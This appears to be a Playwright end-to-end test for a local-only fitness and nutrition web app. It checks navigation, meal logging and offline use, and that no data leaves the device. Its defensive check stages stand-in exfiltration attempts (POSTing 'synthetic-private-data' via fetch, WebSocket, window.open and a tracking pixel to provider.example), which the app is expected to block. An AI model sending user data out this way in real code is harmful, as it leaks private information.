// Exercise the built ORIGINAL app with synthetic data; never opens the user's browser profile.
import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import { readFile, mkdir } from 'node:fs/promises'
import { extname, resolve, sep } from 'node:path'
import { fileURLToPath } from 'node:url'
import { chromium } from 'playwright-core'

const root = fileURLToPath(new URL('../../', import.meta.url))
const dist = resolve(root, 'vendor/opengym-upstream/frontend/dist')
const output = resolve(root, 'artifacts/local-only')
await mkdir(output, { recursive: true })
const requests = [], external = [], errors = []
const mime = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.png': 'image/png', '.svg': 'image/svg+xml', '.webp': 'image/webp', '.mp4': 'video/mp4', '.woff2': 'font/woff2' }
const server = createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost')
  requests.push({ method: req.method, path: url.pathname })
  const file = resolve(dist, '.' + decodeURIComponent(url.pathname === '/' ? '/index.html' : url.pathname))
  if (!file.startsWith(dist + sep)) { res.writeHead(403); res.end(); return }
  try { const bytes = await readFile(file); res.writeHead(200, { 'Content-Type': mime[extname(file)] || 'application/octet-stream' }); res.end(bytes) }
  catch { res.writeHead(404); res.end() }
})
await new Promise(done => server.listen(0, '127.0.0.1', done))
const origin = `http://127.0.0.1:${server.address().port}`
let browser, page
try {
  browser = await chromium.launch({ channel: process.env.REDFIT_BROWSER_CHANNEL || 'chrome', headless: true })
  const context = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true, locale: 'en-GB', timezoneId: 'Europe/Zurich' })
  await context.route('**/*', route => {
    const url = route.request().url()
    if (url.startsWith(origin + '/') || url.startsWith('data:') || url.startsWith('blob:')) return route.continue()
    external.push(url)
    return route.abort()
  })
  page = await context.newPage()
  page.on('pageerror', error => errors.push(error.message))
  await page.goto(origin)
  const skip = page.getByRole('button', { name: 'Skip', exact: true })
  await page.waitForFunction(() => document.querySelector('#tabbar') || document.querySelector('[role="dialog"]'), { timeout: 30000 })
  if (await skip.isVisible()) await skip.click()
  await page.locator('[data-tour="today"]').waitFor({ state: 'visible' })
  for (const [label, path] of [['Plan', '/plan'], ['Stats', '/stats'], ['Exercises', '/library'], ['Home', '/home']]) {
    await page.locator('#tabbar').getByRole('button', { name: label, exact: true }).click()
    await page.waitForURL(url => url.hash === '#' + path)
  }
  await page.goto(origin + '/#/settings')
  await page.getByRole('heading', { name: 'Deine Daten bleiben bei dir' }).waitFor()
  await page.goto(origin + '/#/nutrition')
  await page.getByRole('heading', { name: 'Ernährung', exact: true }).waitFor()
  const food = page.locator('section[aria-labelledby="nutrition-food"]')
  for (const [label, value] of [['Name', 'QA Haferflocken'], ['kcal / 100 g', '370'], ['Protein / 100 g', '13'], ['Kohlenhydrate / 100 g', '60'], ['Fett / 100 g', '7']]) {
    await food.getByLabel(label, { exact: true }).fill(value)
  }
  await food.getByRole('button', { name: 'Lebensmittel speichern', exact: true }).click()
  await page.getByText('Lebensmittel lokal gespeichert.', { exact: true }).waitFor()
  const meal = page.locator('section[aria-labelledby="nutrition-log"]')
  await meal.getByLabel('Menge (g)', { exact: true }).fill('80')
  await meal.getByRole('button', { name: 'Mahlzeit speichern', exact: true }).click()
  await page.getByText('Mahlzeit gespeichert.', { exact: true }).waitFor()
  assert.match(await page.locator('.nutrition-totals').innerText(), /296/)
  await page.reload()
  await page.getByRole('heading', { name: 'Ernährung', exact: true }).waitFor()
  assert.match(await page.locator('.nutrition-totals').innerText(), /296/)
  // Intentional exfiltration attempts must be refused before a network request exists.
  const refused = await page.evaluate(async () => {
    const result = []
    for (const url of ['https://provider.example/chat', '/api/data']) {
      try { await fetch(url, { method: 'POST', body: 'synthetic-private-data' }); result.push(false) }
      catch (error) { result.push(error.code === 'local-only') }
    }
    result.push(window.open('https://provider.example/r#synthetic') === null)
    try { new WebSocket('wss://provider.example'); result.push(false) } catch { result.push(true) }
    const pixel = document.createElement('img'); pixel.id = 'qa-forbidden-pixel'; pixel.src = 'https://provider.example/pixel'; document.body.append(pixel)
    return result
  })
  assert.deepEqual(refused, [true, true, true, true])
  await page.evaluate(() => new Promise(done => requestAnimationFrame(() => { document.getElementById('qa-forbidden-pixel')?.remove(); done() })))
  await page.screenshot({ path: resolve(output, 'nutrition-local-only.png'), fullPage: true })
  await context.setOffline(true)
  await page.goto(origin + '/#/home')
  await page.locator('[data-tour="today"]').waitFor({ state: 'visible' })
  assert.deepEqual(external, [], 'the app attempted an external request')
  assert.equal(requests.filter(r => /(^|\/)api(\/|$)/.test(r.path) || !['GET', 'HEAD'].includes(r.method)).length, 0, 'app sent data to a server')
  assert.deepEqual(errors, [], 'uncaught browser errors')
  console.log(JSON.stringify({ status: 'passed', originalApp: true, navigation: 4, nutrition: '80g = 296kcal, preserved after reload', offlineNavigation: true, refusedTransports: refused.length, externalRequests: external.length, serverApiRequests: 0, screenshot: 'artifacts/local-only/nutrition-local-only.png' }, null, 2))
} catch (error) {
  console.error(JSON.stringify({ body: (await page?.locator('body').innerText().catch(() => ''))?.slice(0, 1500), errors, external, requests: requests.slice(-8) }, null, 2))
  await page?.screenshot({ path: resolve(output, 'failure.png'), fullPage: true }).catch(() => {})
  throw error
} finally {
  await browser?.close()
  await new Promise(done => server.close(done))
}
